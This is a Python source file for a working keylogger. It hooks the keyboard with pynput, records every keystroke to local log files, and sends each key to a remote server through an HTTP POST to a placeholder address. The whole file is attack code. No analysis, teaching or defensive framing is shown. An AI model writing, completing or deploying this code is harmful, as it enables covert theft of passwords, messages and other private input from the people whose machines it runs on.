import logging
import requests
from pynput import keyboard
import os

# Ensure the log directory exists
log_directory = os.path.expanduser('~/keylogger_logs')
if not os.path.exists(log_directory):
    os.makedirs(log_directory)

# Configure logging
log_file = os.path.join(log_directory, 'keylogger.log')
readable_log_file = os.path.join(log_directory, 'keylogger_readable.log')

logging.basicConfig(filename=log_file, level=logging.INFO, 
                    format='%(asctime)s: %(message)s')

readable_logger = logging.getLogger('readable_logger')
readable_handler = logging.FileHandler(readable_log_file)
readable_handler.setLevel(logging.INFO)
readable_formatter = logging.Formatter('%(asctime)s - %(message)s')
readable_handler.setFormatter(readable_formatter)
readable_logger.addHandler(readable_handler)

def send_to_server(data):
    url = 'http://x.x.x.x:port/keylogger'
    try:
        response = requests.post(url, json=data)
        if response.status_code == 200:
            logging.info(f"Successfully sent data to server: {data}")
        else:
            logging.error(f"Failed to send data to server. Status code: {response.status_code}")
    except requests.RequestException as e:
        logging.error(f"Error sending data to server: {e}")

def on_press(key):
    try:
        key_data = {'key': key.char}
    except AttributeError:
        key_data = {'key': str(key)}
    
    logging.info(f"Key pressed: {key_data['key']}")
    readable_logger.info(f"Key pressed: {key_data['key']}")
    send_to_server(key_data)

def main():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
